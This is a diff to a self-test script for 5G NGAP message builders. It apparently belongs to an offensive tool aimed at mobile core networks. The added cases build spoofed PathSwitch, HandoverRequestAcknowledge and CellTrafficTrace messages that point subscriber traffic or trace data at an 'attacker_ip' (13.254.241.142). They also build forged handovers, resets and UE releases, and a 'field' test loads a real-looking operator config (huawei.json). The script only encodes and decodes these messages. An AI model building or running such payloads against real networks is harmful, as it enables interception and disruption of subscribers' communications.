@@ -16,15 +16,21 @@ CFG = {"mcc": "001", "mnc": "01", "tac": 1, "sst": 1, "sd": "010203",
 cases = {
     "NGSetupRequest": B.ng_setup_request(CFG),
     "UEContextReleaseRequest": B.ue_context_release_request(1, 1),
+    "UEContextReleaseComplete": B.ue_context_release_complete(1, 99, pdu_sessions=[1]),
     "ErrorIndication(UE)": B.error_indication(1, 1),
     "NGReset(partial)": B.ng_reset_partial([(1, 1), (2, 2)]),
+    "NGReset(AMF-id-only)": B.ng_reset_partial([(1, None)]),
     "PathSwitchRequest": B.path_switch_request(1, 99, CFG, pdu_sessions=[1],
                                                attacker_ip="172.30.200.99",
                                                teid=0xdeadbeef),
+    "InitialUEMessage": B.initial_ue_message(
+        99, CFG, amf_set_id=0x1, amf_pointer=0x0, tmsi="aabbccdd"),
     "HandoverRequired": B.handover_required(1, 99, CFG, target_gnb_id=0xABCDE),
+    "HandoverRequestAcknowledge": B.handover_request_acknowledge(
+        1, 99, attacker_ip="13.254.241.142", teid=1),
     "RANConfigurationUpdate": B.ran_configuration_update(CFG, tac=1),
     "UplinkRANConfigurationTransfer": B.uplink_ran_configuration_transfer(
-        CFG, target_gnb_id=0xABCDE),
+        CFG, target_gnb_id=1, source_gnb_id=4660),
     "PDUSessionResourceNotify": B.pdu_session_resource_notify(1, 99),
     "HandoverNotify": B.handover_notify(1, 99, CFG),
     "UplinkUEAssociatedNRPPaTransport": B.uplink_ue_associated_nrppa_transport(1, 99),
@@ -104,5 +110,53 @@ try:
 except Exception as e:
     ok = False
     print(f"[ERR] paging-extractor            {type(e).__name__}: {e}")
+
+def _self_test_huawei_field():
+    """Same builders, field config (huawei.json). Catches PLMN/SD/bind-shaped bugs."""
+    import json
+    from pathlib import Path
+    p = Path(__file__).resolve().parent / "config" / "huawei.json"
+    if not p.is_file():
+        print("[SKIP] huawei.json not present")
+        return
+    cfg = json.loads(p.read_text(encoding="utf-8"))
+    field = {
+        "PathSwitch(huawei)": B.path_switch_request(
+            123456, 99, cfg, pdu_sessions=[1], attacker_ip="13.254.241.142"),
+        "UERelease(huawei)": B.ue_context_release_request(123456, 1),
+        "ErrorInd(huawei)": B.error_indication(123456, None),
+        "NGReset(huawei)": B.ng_reset_partial([(123456, 1)]),
+        "HORequired(huawei self)": B.handover_required(
+            123456, 99, cfg, target_gnb_id=int(cfg["gnb_id"])),
+        "HORequired(huawei fake)": B.handover_required(
+            123456, 99, cfg, target_gnb_id=0xABCDE),
+        "InitUE(huawei)": B.initial_ue_message(
+            99, cfg, amf_set_id=1, amf_pointer=0, tmsi="c0000001"),
+        "RANCfgUpd(huawei)": B.ran_configuration_update(cfg, tac=int(cfg["tac"])),
+        "SON(huawei->gnb1)": B.uplink_ran_configuration_transfer(
+            cfg, target_gnb_id=1),
+        "HONotify(huawei)": B.handover_notify(123456, 99, cfg),
+        "PDUNotify(huawei)": B.pdu_session_resource_notify(123456, 99),
+        "CellTrace(huawei)": B.cell_traffic_trace(
+            123456, 99, cfg, tce_ip="13.254.241.142"),
+        "ULStatus(huawei)": B.uplink_ran_status_transfer(123456, 99),
+        "ULNRPPa(huawei)": B.uplink_ue_associated_nrppa_transport(123456, 99),
+        "HOReqAck(huawei)": B.handover_request_acknowledge(
+            123456, 99, attacker_ip="13.254.241.142"),
+        "NGSetup(huawei)": B.ng_setup_request(cfg),
+    }
+    global ok
+    for name, val in field.items():
+        data = ngap.encode(val)
+        back = ngap.decode(data)
+        assert ngap.message_type(back) == ngap.message_type(val)
+        print(f"[OK]  {name:26s} {len(data):3d} bytes")
+
+
+try:
+    _self_test_huawei_field()
+except Exception as e:
+    ok = False
+    print(f"[ERR] huawei-field-encode         {type(e).__name__}: {e}")
 
 print("\nALL OK" if ok else "\nSOME FAILED")
